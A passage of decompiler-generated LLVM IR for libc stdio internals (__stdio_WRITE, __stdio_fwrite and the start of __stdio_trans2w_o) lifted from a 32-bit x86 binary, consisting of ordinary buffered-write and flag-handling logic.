  uselistorder i1* %zf.global-to-local, { 1, 0, 2, 7, 4, 5, 6, 12, 8, 3, 9, 10, 11 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 5, 3, 6, 4 }
  uselistorder i1 true, { 6, 7, 8, 2, 4, 5, 0, 3, 1 }
  uselistorder i32 84, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805199d, { 1, 0 }
  uselistorder label %dec_label_pc_8051999, { 1, 0 }
  uselistorder label %dec_label_pc_8051977, { 1, 0 }
  uselistorder label %dec_label_pc_8051969, { 1, 0 }
  uselistorder label %dec_label_pc_8051967, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_80519a9 = load i32, i32* @edi, align 4
  %v0_80519ab = load i32, i32* @ebx, align 4
  %v15_80519ac = ptrtoint i32* %stack_var_-28 to i32
  %v4_80519af = ptrtoint i16* %arg1 to i32
  store i32 %v4_80519af, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80519bb5 = icmp eq i32 %arg3, 0
  store i1 %v1_80519bb5, i1* %zf.global-to-local, align 1
  br i1 %v1_80519bb5, label %dec_label_pc_8051a1c, label %dec_label_pc_80519c0.lr.ph

dec_label_pc_80519c0.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80519c0

dec_label_pc_80519c0:                             ; preds = %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge, %dec_label_pc_80519c0.lr.ph
  %v0_80519cd = phi i32 [ %v4_80519af, %dec_label_pc_80519c0.lr.ph ], [ %v0_80519cd.pre, %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge ]
  %v0_80519cc = phi i32 [ %arg2, %dec_label_pc_80519c0.lr.ph ], [ %v2_80519de, %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge ]
  %v0_80519c8.in = phi i32 [ %arg3, %dec_label_pc_80519c0.lr.ph ], [ %v2_80519dc, %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge ]
  %v4_80519c8 = phi i32 [ %arg3, %dec_label_pc_80519c0.lr.ph ], [ %v2_80519dc, %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge ]
  %v0_80519c8 = icmp slt i32 %v0_80519c8.in, 0
  store i32 %v4_80519c8, i32* %esi.global-to-local, align 4
  %v2_80519c8 = icmp eq i1 %v0_80519c8, false
  %v5_80519c8 = select i1 %v2_80519c8, i32 %v4_80519c8, i32 2147483647
  store i32 %v5_80519c8, i32* %eax.global-to-local, align 4
  %v1_80519cd = add i32 %v0_80519cd, 4
  %v2_80519cd = inttoptr i32 %v1_80519cd to i32*
  %v3_80519cd = load i32, i32* %v2_80519cd, align 4
  %tmp37 = inttoptr i32 %v0_80519cc to i32*
  %v5_80519d0 = call i32 @__libc_write(i32 %v3_80519cd, i32* %tmp37, i32 %v5_80519c8)
  store i32 %v5_80519d0, i32* %eax.global-to-local, align 4
  %v1_80519d8 = icmp eq i32 %v5_80519d0, 0
  store i1 %v1_80519d8, i1* %zf.global-to-local, align 1
  %v2_80519d8 = icmp slt i32 %v5_80519d0, 0
  br i1 %v2_80519d8, label %dec_label_pc_80519e2, label %dec_label_pc_80519dc

dec_label_pc_80519dc:                             ; preds = %dec_label_pc_80519c0
  %v0_80519dc = load i32, i32* @ebx, align 4
  %v2_80519dc = sub i32 %v0_80519dc, %v5_80519d0
  %v12_80519dc = icmp eq i32 %v2_80519dc, 0
  store i32 %v2_80519dc, i32* @ebx, align 4
  %v0_80519de = load i32, i32* @edi, align 4
  %v2_80519de = add i32 %v0_80519de, %v5_80519d0
  store i32 %v2_80519de, i32* @edi, align 4
  store i1 %v12_80519dc, i1* %zf.global-to-local, align 1
  br i1 %v12_80519dc, label %dec_label_pc_8051a1c, label %dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge

dec_label_pc_80519dc.dec_label_pc_80519c0_crit_edge: ; preds = %dec_label_pc_80519dc
  %v0_80519cd.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80519c0

dec_label_pc_80519e2:                             ; preds = %dec_label_pc_80519c0
  %v0_80519e2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80519e2 = inttoptr i32 %v0_80519e2 to i32*
  %v2_80519e2 = load i32, i32* %v1_80519e2, align 4
  store i32 %v2_80519e2, i32* %eax.global-to-local, align 4
  %v1_80519e5 = add i32 %v0_80519e2, 8
  %v2_80519e5 = inttoptr i32 %v1_80519e5 to i32*
  %v3_80519e5 = load i32, i32* %v2_80519e5, align 4
  store i32 %v3_80519e5, i32* @edx, align 4
  %v1_80519e8 = or i32 %v2_80519e2, 8
  store i32 %v1_80519e8, i32* %eax.global-to-local, align 4
  %v1_80519eb = trunc i32 %v1_80519e8 to i16
  %v3_80519eb = inttoptr i32 %v0_80519e2 to i16*
  store i16 %v1_80519eb, i16* %v3_80519eb, align 2
  %v0_80519ef = load i32, i32* %ebp.global-to-local, align 4
  %v1_80519ef = add i32 %v0_80519ef, 12
  %v2_80519ef = inttoptr i32 %v1_80519ef to i32*
  %v3_80519ef = load i32, i32* %v2_80519ef, align 4
  %v1_80519f2 = load i32, i32* @edx, align 4
  %v2_80519f2 = sub i32 %v3_80519ef, %v1_80519f2
  %v12_80519f2 = icmp eq i32 %v2_80519f2, 0
  store i1 %v12_80519f2, i1* %zf.global-to-local, align 1
  store i32 %v2_80519f2, i32* %eax.global-to-local, align 4
  %v4_8051a18.pre = load i32, i32* @ebx, align 4
  br i1 %v12_80519f2, label %dec_label_pc_8051a18, label %dec_label_pc_80519f6

dec_label_pc_80519f6:                             ; preds = %dec_label_pc_80519e2
  %v12_80519f6 = icmp eq i32 %v2_80519f2, %v4_8051a18.pre
  store i1 %v12_80519f6, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_80519f2, %v4_8051a18.pre
  %v3_80519f8 = load i32, i32* %esi.global-to-local, align 4
  %v5_80519f8 = select i1 %tmp, i32 %v2_80519f2, i32 %v3_80519f8
  store i32 %v5_80519f8, i32* %esi.global-to-local, align 4
  %v0_80519fb.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80519fb

dec_label_pc_80519fb:                             ; preds = %dec_label_pc_8051a0d, %dec_label_pc_80519f6
  %v2_80519ff = phi i32 [ %v1_8051a09, %dec_label_pc_8051a0d ], [ %v1_80519f2, %dec_label_pc_80519f6 ]
  %v4_80519fb = phi i32 [ %v4_80519fb.pre, %dec_label_pc_8051a0d ], [ %v2_80519f2, %dec_label_pc_80519f6 ]
  %v0_80519fb = phi i32 [ %v1_8051a0d, %dec_label_pc_8051a0d ], [ %v0_80519fb.pre, %dec_label_pc_80519f6 ]
  %v1_80519fb = inttoptr i32 %v0_80519fb to i8*
  %v2_80519fb = load i8, i8* %v1_80519fb, align 1
  %v3_80519fb = zext i8 %v2_80519fb to i32
  %v5_80519fb = and i32 %v4_80519fb, -256
  %v6_80519fb = or i32 %v3_80519fb, %v5_80519fb
  store i32 %v6_80519fb, i32* %eax.global-to-local, align 4
  %v10_80519fd = icmp eq i8 %v2_80519fb, 10
  store i1 %v10_80519fd, i1* %zf.global-to-local, align 1
  %v3_80519ff = inttoptr i32 %v2_80519ff to i8*
  store i8 %v2_80519fb, i8* %v3_80519ff, align 1
  %v0_8051a01 = load i1, i1* %zf.global-to-local, align 1
  %v1_8051a01 = icmp eq i1 %v0_8051a01, false
  br i1 %v1_8051a01, label %dec_label_pc_8051a09, label %dec_label_pc_8051a03

dec_label_pc_8051a03:                             ; preds = %dec_label_pc_80519fb
  %v0_8051a03 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051a03 = add i32 %v0_8051a03, 1
  %v2_8051a03 = inttoptr i32 %v1_8051a03 to i8*
  %v3_8051a03 = load i8, i8* %v2_8051a03, align 1
  %v4_8051a03 = urem i8 %v3_8051a03, 2
  %v5_8051a03 = icmp eq i8 %v4_8051a03, 0
  store i1 %v5_8051a03, i1* %zf.global-to-local, align 1
  %v1_8051a07 = icmp eq i1 %v5_8051a03, false
  br i1 %v1_8051a07, label %dec_label_pc_8051a03.dec_label_pc_8051a10_crit_edge, label %dec_label_pc_8051a09

dec_label_pc_8051a03.dec_label_pc_8051a10_crit_edge: ; preds = %dec_label_pc_8051a03
  %v0_8051a10.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051a10

dec_label_pc_8051a09:                             ; preds = %dec_label_pc_8051a03, %dec_label_pc_80519fb
  %v0_8051a09 = load i32, i32* @edx, align 4
  %v1_8051a09 = add i32 %v0_8051a09, 1
  store i32 %v1_8051a09, i32* @edx, align 4
  %v0_8051a0a = load i32, i32* %esi.global-to-local, align 4
  %v1_8051a0a = add i32 %v0_8051a0a, -1
  %v8_8051a0a = icmp eq i32 %v1_8051a0a, 0
  store i1 %v8_8051a0a, i1* %zf.global-to-local, align 1
  store i32 %v1_8051a0a, i32* %esi.global-to-local, align 4
  br i1 %v8_8051a0a, label %dec_label_pc_8051a09.dec_label_pc_8051a10_crit_edge, label %dec_label_pc_8051a0d

dec_label_pc_8051a09.dec_label_pc_8051a10_crit_edge: ; preds = %dec_label_pc_8051a09
  %v1_8051a10.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051a10

dec_label_pc_8051a0d:                             ; preds = %dec_label_pc_8051a09
  %v0_8051a0d = load i32, i32* @edi, align 4
  %v1_8051a0d = add i32 %v0_8051a0d, 1
  %v8_8051a0d = icmp eq i32 %v1_8051a0d, 0
  store i1 %v8_8051a0d, i1* %zf.global-to-local, align 1
  store i32 %v1_8051a0d, i32* @edi, align 4
  %v4_80519fb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80519fb

dec_label_pc_8051a10:                             ; preds = %dec_label_pc_8051a09.dec_label_pc_8051a10_crit_edge, %dec_label_pc_8051a03.dec_label_pc_8051a10_crit_edge
  %v1_8051a10 = phi i32 [ %v0_8051a03, %dec_label_pc_8051a03.dec_label_pc_8051a10_crit_edge ], [ %v1_8051a10.pre, %dec_label_pc_8051a09.dec_label_pc_8051a10_crit_edge ]
  %v0_8051a10 = phi i32 [ %v0_8051a10.pre, %dec_label_pc_8051a03.dec_label_pc_8051a10_crit_edge ], [ %v1_8051a09, %dec_label_pc_8051a09.dec_label_pc_8051a10_crit_edge ]
  %v2_8051a10 = add i32 %v1_8051a10, 16
  %v3_8051a10 = inttoptr i32 %v2_8051a10 to i32*
  store i32 %v0_8051a10, i32* %v3_8051a10, align 4
  %v0_8051a13 = load i32, i32* @edx, align 4
  %v1_8051a13 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051a13 = add i32 %v1_8051a13, 8
  %v3_8051a13 = inttoptr i32 %v2_8051a13 to i32*
  %v4_8051a13 = load i32, i32* %v3_8051a13, align 4
  %v5_8051a13 = sub i32 %v0_8051a13, %v4_8051a13
  store i32 %v5_8051a13, i32* @edx, align 4
  %v0_8051a16 = load i32, i32* @ebx, align 4
  %v2_8051a16 = sub i32 %v0_8051a16, %v5_8051a13
  %v12_8051a16 = icmp eq i32 %v2_8051a16, 0
  store i1 %v12_8051a16, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8051a18

dec_label_pc_8051a18:                             ; preds = %dec_label_pc_80519e2, %dec_label_pc_8051a10
  %v4_8051a18 = phi i32 [ %v2_8051a16, %dec_label_pc_8051a10 ], [ %v4_8051a18.pre, %dec_label_pc_80519e2 ]
  %v5_8051a18 = sub i32 %arg3, %v4_8051a18
  %v15_8051a18 = icmp eq i32 %v5_8051a18, 0
  store i1 %v15_8051a18, i1* %zf.global-to-local, align 1
  %v0_8051a20.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051a1c

dec_label_pc_8051a1c:                             ; preds = %dec_label_pc_80519dc, %entry, %dec_label_pc_8051a18
  %v0_8051a20 = phi i32 [ %v0_8051a20.pre, %dec_label_pc_8051a18 ], [ %v15_80519ac, %entry ], [ %v15_80519ac, %dec_label_pc_80519dc ]
  %stack_var_12.0 = phi i32 [ %v5_8051a18, %dec_label_pc_8051a18 ], [ 0, %entry ], [ %arg3, %dec_label_pc_80519dc ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8051a20 = icmp eq i32 %v0_8051a20, -12
  store i1 %v9_8051a20, i1* %zf.global-to-local, align 1
  store i32 %v0_80519ab, i32* @ebx, align 4
  store i32 %v0_80519a9, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8051a0d, { 1, 2, 0 }
  uselistorder i32 %v1_8051a0a, { 1, 0 }
  uselistorder i32 %v1_8051a09, { 0, 2, 1 }
  uselistorder i8 %v2_80519fb, { 1, 0, 2 }
  uselistorder i32 %v4_8051a18.pre, { 2, 0, 1 }
  uselistorder i32 %v2_80519f2, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_80519de, { 1, 0 }
  uselistorder i32 %v2_80519dc, { 2, 3, 0, 1 }
  uselistorder i32 %v5_80519d0, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 4, 5, 0, 6 }
  uselistorder i32 -12, { 0, 4, 16, 15, 1, 9, 5, 2, 6, 7, 8, 10, 11, 3, 13, 12, 14, 17 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 1, 0 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_8051a1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051a18, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051a28 = load i32, i32* @ebp, align 4
  %v0_8051a29 = load i32, i32* @edi, align 4
  %v0_8051a2a = load i32, i32* @esi, align 4
  %v0_8051a2b = load i32, i32* @ebx, align 4
  store i32 %v0_8051a2b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8051a3b = add i32 %arg3, 1
  %v2_8051a3b = inttoptr i32 %v1_8051a3b to i8*
  %v3_8051a3b = load i8, i8* %v2_8051a3b, align 1
  %v4_8051a3b = and i8 %v3_8051a3b, 2
  %v5_8051a3b = icmp eq i8 %v4_8051a3b, 0
  %v1_8051a3f = icmp eq i1 %v5_8051a3b, false
  br i1 %v1_8051a3f, label %dec_label_pc_8051af0, label %dec_label_pc_8051a45

dec_label_pc_8051a45:                             ; preds = %entry
  %v1_8051a45 = add i32 %arg3, 4
  %v2_8051a45 = inttoptr i32 %v1_8051a45 to i32*
  %v3_8051a45 = load i32, i32* %v2_8051a45, align 4
  %v13_8051a45 = icmp eq i32 %v3_8051a45, -2
  %v1_8051a49 = add i32 %arg3, 16
  %v2_8051a49 = inttoptr i32 %v1_8051a49 to i32*
  %v3_8051a49 = load i32, i32* %v2_8051a49, align 4
  store i32 %v3_8051a49, i32* @edx, align 4
  %v1_8051a4c = add i32 %arg3, 12
  %v2_8051a4c = inttoptr i32 %v1_8051a4c to i32*
  %v3_8051a4c = load i32, i32* %v2_8051a4c, align 4
  store i32 %v3_8051a4c, i32* %eax.global-to-local, align 4
  %v1_8051a4f = icmp eq i1 %v13_8051a45, false
  %v2_8051a6e = sub i32 %v3_8051a4c, %v3_8051a49
  br i1 %v1_8051a4f, label %dec_label_pc_8051a6e, label %dec_label_pc_8051a51

dec_label_pc_8051a51:                             ; preds = %dec_label_pc_8051a45
  %tmp = icmp uge i32 %v2_8051a6e, %arg2
  %v5_8051a58 = select i1 %tmp, i32 %arg2, i32 %v2_8051a6e
  store i32 %v5_8051a58, i32* %ebx.global-to-local, align 4
  %v3_8051a5e = inttoptr i32 %v3_8051a49 to i16*
  %v4_8051a5e = call i32 @memcpy(i16* %v3_8051a5e, i32 %v5_8051a58, i32 %v3_8051a4c)
  store i32 %v4_8051a5e, i32* %eax.global-to-local, align 4
  %v0_8051a66 = load i32, i32* @esi, align 4
  %v1_8051a66 = add i32 %v0_8051a66, 16
  %v2_8051a66 = inttoptr i32 %v1_8051a66 to i32*
  %v3_8051a66 = load i32, i32* %v2_8051a66, align 4
  %v4_8051a66 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8051a66 = add i32 %v4_8051a66, %v3_8051a66
  store i32 %v5_8051a66, i32* %v2_8051a66, align 4
  br label %dec_label_pc_8051b08

dec_label_pc_8051a6e:                             ; preds = %dec_label_pc_8051a45
  store i32 %v2_8051a6e, i32* %eax.global-to-local, align 4
  %v6_8051a72 = icmp ult i32 %v2_8051a6e, %arg2
  br i1 %v6_8051a72, label %dec_label_pc_8051ad7, label %dec_label_pc_8051a74

dec_label_pc_8051a74:                             ; preds = %dec_label_pc_8051a6e
  %v0_8051a74 = load i32, i32* @ecx, align 4
  %v3_8051a78 = inttoptr i32 %v3_8051a49 to i16*
  %v4_8051a78 = call i32 @memcpy(i16* %v3_8051a78, i32 %arg2, i32 %v0_8051a74)
  store i32 %v4_8051a78, i32* %eax.global-to-local, align 4
  %v0_8051a80 = load i32, i32* @esi, align 4
  %v1_8051a80 = add i32 %v0_8051a80, 16
  %v2_8051a80 = inttoptr i32 %v1_8051a80 to i32*
  %v3_8051a80 = load i32, i32* %v2_8051a80, align 4
  %v4_8051a80 = load i32, i32* @edi, align 4
  %v5_8051a80 = add i32 %v4_8051a80, %v3_8051a80
  store i32 %v5_8051a80, i32* %v2_8051a80, align 4
  %v0_8051a83 = load i32, i32* @esi, align 4
  %v1_8051a83 = add i32 %v0_8051a83, 1
  %v2_8051a83 = inttoptr i32 %v1_8051a83 to i8*
  %v3_8051a83 = load i8, i8* %v2_8051a83, align 1
  %v4_8051a83 = urem i8 %v3_8051a83, 2
  %v5_8051a83 = icmp eq i8 %v4_8051a83, 0
  br i1 %v5_8051a83, label %dec_label_pc_8051b08, label %dec_label_pc_8051a89

dec_label_pc_8051a89:                             ; preds = %dec_label_pc_8051a74
  %v0_8051a89 = load i32, i32* @edx, align 4
  %v0_8051a8a = load i32, i32* @edi, align 4
  %v4_8051a8e = call i32 @memrchr(i8 10, i32 %v0_8051a8a, i32 %v0_8051a89)
  store i32 %v4_8051a8e, i32* %eax.global-to-local, align 4
  %v1_8051a96 = icmp eq i32 %v4_8051a8e, 0
  br i1 %v1_8051a96, label %dec_label_pc_8051b08, label %dec_label_pc_8051a9a

dec_label_pc_8051a9a:                             ; preds = %dec_label_pc_8051a89
  %v0_8051a9d = load i32, i32* @esi, align 4
  %v1_8051a9e = call i32 @__stdio_wcommit(i32 %v0_8051a9d)
  store i32 %v1_8051a9e, i32* %eax.global-to-local, align 4
  %v1_8051aa6 = icmp eq i32 %v1_8051a9e, 0
  br i1 %v1_8051aa6, label %dec_label_pc_8051b08, label %dec_label_pc_8051aaa

dec_label_pc_8051aaa:                             ; preds = %dec_label_pc_8051a9a
  %v0_8051aaa = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_8051aaa, %v1_8051a9e
  %v5_8051aae = select i1 %tmp20, i32 %v0_8051aaa, i32 %v1_8051a9e
  store i32 %v5_8051aae, i32* %ebx.global-to-local, align 4
  %v2_8051ab3 = sub i32 %v0_8051aaa, %v5_8051aae
  store i32 %v2_8051ab3, i32* %eax.global-to-local, align 4
  %v0_8051ab5 = load i32, i32* @ebp, align 4
  %v2_8051ab5 = add i32 %v0_8051ab5, %v2_8051ab3
  store i32 %v2_8051ab5, i32* %ebp.global-to-local, align 4
  %v4_8051abc = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_8051aae, i32 %v2_8051ab3)
  store i32 %v4_8051abc, i32* %eax.global-to-local, align 4
  %v1_8051ac4 = icmp eq i32 %v4_8051abc, 0
  store i32 %v4_8051abc, i32* @edx, align 4
  br i1 %v1_8051ac4, label %dec_label_pc_8051b08, label %dec_label_pc_8051aca

dec_label_pc_8051aca:                             ; preds = %dec_label_pc_8051aaa
  %v0_8051aca = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051aca = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051aca = sub i32 %v0_8051aca, %v4_8051abc
  %v2_8051ace = add i32 %v2_8051aca, %v1_8051aca
  store i32 %v2_8051ace, i32* %eax.global-to-local, align 4
  %v0_8051ad0 = load i32, i32* @esi, align 4
  %v1_8051ad0 = add i32 %v0_8051ad0, 16
  %v2_8051ad0 = inttoptr i32 %v1_8051ad0 to i32*
  %v3_8051ad0 = load i32, i32* %v2_8051ad0, align 4
  %v5_8051ad0 = sub i32 %v3_8051ad0, %v2_8051ace
  store i32 %v5_8051ad0, i32* %v2_8051ad0, align 4
  %v0_8051ad3 = load i32, i32* @edi, align 4
  %v1_8051ad3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051ad3 = sub i32 %v0_8051ad3, %v1_8051ad3
  store i32 %v2_8051ad3, i32* @edi, align 4
  br label %dec_label_pc_8051b08

dec_label_pc_8051ad7:                             ; preds = %dec_label_pc_8051a6e
  %v2_8051ad7 = add i32 %arg3, 8
  %v3_8051ad7 = inttoptr i32 %v2_8051ad7 to i32*
  %v4_8051ad7 = load i32, i32* %v3_8051ad7, align 4
  %v15_8051ad7 = icmp eq i32 %v3_8051a49, %v4_8051ad7
  br i1 %v15_8051ad7, label %dec_label_pc_8051af0, label %dec_label_pc_8051adc

dec_label_pc_8051adc:                             ; preds = %dec_label_pc_8051ad7
  %v1_8051ae0 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8051ae0, i32* %eax.global-to-local, align 4
  %v1_8051ae8 = icmp eq i32 %v1_8051ae0, 0
  br i1 %v1_8051ae8, label %dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge, label %dec_label_pc_8051aec

dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge: ; preds = %dec_label_pc_8051adc
  %v0_8051af0.pre = load i32, i32* @edi, align 4
  %v0_8051af8.pre = load i32, i32* @esi, align 4
  %v2_8051aff.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8051af0

dec_label_pc_8051aec:                             ; preds = %dec_label_pc_8051adc
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8051b08

dec_label_pc_8051af0:                             ; preds = %dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge, %dec_label_pc_8051ad7, %entry
  %v2_8051aff = phi i32 [ %v2_8051aff.pre, %dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge ], [ %v0_8051a2b, %dec_label_pc_8051ad7 ], [ %v0_8051a2b, %entry ]
  %v0_8051af8 = phi i32 [ %v0_8051af8.pre, %dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge ], [ %arg3, %dec_label_pc_8051ad7 ], [ %arg3, %entry ]
  %v0_8051af0 = phi i32 [ %v0_8051af0.pre, %dec_label_pc_8051adc.dec_label_pc_8051af0_crit_edge ], [ %arg2, %dec_label_pc_8051ad7 ], [ %arg2, %entry ]
  store i32 %v2_8051aff, i32* @ebx, align 4
  store i32 %v0_8051a29, i32* @edi, align 4
  %v4_8051b03 = inttoptr i32 %v0_8051af8 to i16*
  %v5_8051b03 = call i32 @__stdio_WRITE(i16* %v4_8051b03, i32 %v0_8051af0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051b03, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b08

dec_label_pc_8051b08:                             ; preds = %dec_label_pc_8051aaa, %dec_label_pc_8051a9a, %dec_label_pc_8051a89, %dec_label_pc_8051a74, %dec_label_pc_8051aec, %dec_label_pc_8051aca, %dec_label_pc_8051a51, %dec_label_pc_8051af0
  %v0_8051b0b = load i32, i32* @edi, align 4
  store i32 %v0_8051b0b, i32* %eax.global-to-local, align 4
  %v2_8051b0d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051b0d, i32* @ebx, align 4
  store i32 %v0_8051a2a, i32* @esi, align 4
  store i32 %v0_8051a29, i32* @edi, align 4
  store i32 %v0_8051a28, i32* @ebp, align 4
  ret i32 %v0_8051b0b

; uselistorder directives
  uselistorder i32 %v2_8051ace, { 1, 0 }
  uselistorder i32 %v0_8051aaa, { 2, 1, 0 }
  uselistorder i32 %v1_8051a9e, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8051a6e, { 2, 3, 1, 0 }
  uselistorder i32 %v3_8051a49, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_8051a29, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 38, 39, 35, 36, 37, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 54, 55, 52, 53 }
  uselistorder i8 10, { 12, 0, 1, 2, 13, 11, 14, 3, 15, 4, 16, 5, 6, 7, 8, 9, 10, 17 }
  uselistorder i8 2, { 2, 15, 3, 0, 23, 20, 4, 5, 6, 7, 8, 21, 22, 9, 10, 16, 11, 17, 12, 18, 19, 14, 13, 1 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8051b08, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051b14 = load i32, i32* @ebx, align 4
  %v4_8051b18 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051b18, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8051b20 = load i16, i16* %arg1, align 2
  %v3_8051b20 = zext i16 %v2_8051b20 to i32
  store i32 %v3_8051b20, i32* %eax.global-to-local, align 4
  %v2_8051b23 = and i32 %v3_8051b20, %arg2
  %v3_8051b23 = icmp eq i32 %v2_8051b23, 0
  %v1_8051b25 = icmp eq i1 %v3_8051b23, false
  br i1 %v1_8051b25, label %dec_label_pc_8051b33, label %dec_label_pc_8051b27

dec_label_pc_8051b27:                             ; preds = %entry
  %v1_8051b27 = and i32 %v3_8051b20, 2176
  %v2_8051b27 = icmp eq i32 %v1_8051b27, 0
  %v1_8051b2c = icmp eq i1 %v2_8051b27, false
  br i1 %v1_8051b2c, label %dec_label_pc_8051b3b, label %dec_label_pc_8051b2e

dec_label_pc_8051b2e:                             ; preds = %dec_label_pc_8051b27
  %v2_8051b2e = or i32 %v3_8051b20, %arg2
  store i32 %v2_8051b2e, i32* %eax.global-to-local, align 4
  %v1_8051b30 = trunc i32 %v2_8051b2e to i16
  store i16 %v1_8051b30, i16* %arg1, align 2
  %v0_8051b33.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b33

dec_label_pc_8051b33:                             ; preds = %entry, %dec_label_pc_8051b2e
  %v0_8051b7c = phi i32 [ %v4_8051b18, %entry ], [ %v0_8051b33.pre, %dec_label_pc_8051b2e ]
  %v1_8051b33 = inttoptr i32 %v0_8051b7c to i16*
  %v2_8051b33 = load i16, i16* %v1_8051b33, align 2
  %v3_8051b33 = zext i16 %v2_8051b33 to i32
  store i32 %v3_8051b33, i32* %edx.global-to-local, align 4
  %v2_8051b36 = and i16 %v2_8051b33, 32
  %v3_8051b36 = icmp eq i16 %v2_8051b36, 0
  br i1 %v3_8051b36, label %dec_label_pc_8051b53, label %dec_label_pc_8051b3b

dec_label_pc_8051b3b:                             ; preds = %dec_label_pc_8051b33, %dec_label_pc_8051b27
  %v1_8051b3b = call i32 @__errno_location(i32 %v0_8051b14)
  store i32 %v1_8051b3b, i32* %eax.global-to-local, align 4
  %v1_8051b40 = inttoptr i32 %v1_8051b3b to i32*
  store i32 9, i32* %v1_8051b40, align 4
  br label %dec_label_pc_8051b46

dec_label_pc_8051b46:                             ; preds = %dec_label_pc_8051b6a, %dec_label_pc_8051b3b
  %v0_8051b46 = load i32, i32* @ebx, align 4
  %v1_8051b46 = inttoptr i32 %v0_8051b46 to i32*
  %v2_8051b46 = load i32, i32* %v1_8051b46, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8051b4b = or i32 %v2_8051b46, 8
  store i32 %v1_8051b4b, i32* %eax.global-to-local, align 4
  %v1_8051b4e = trunc i32 %v1_8051b4b to i16
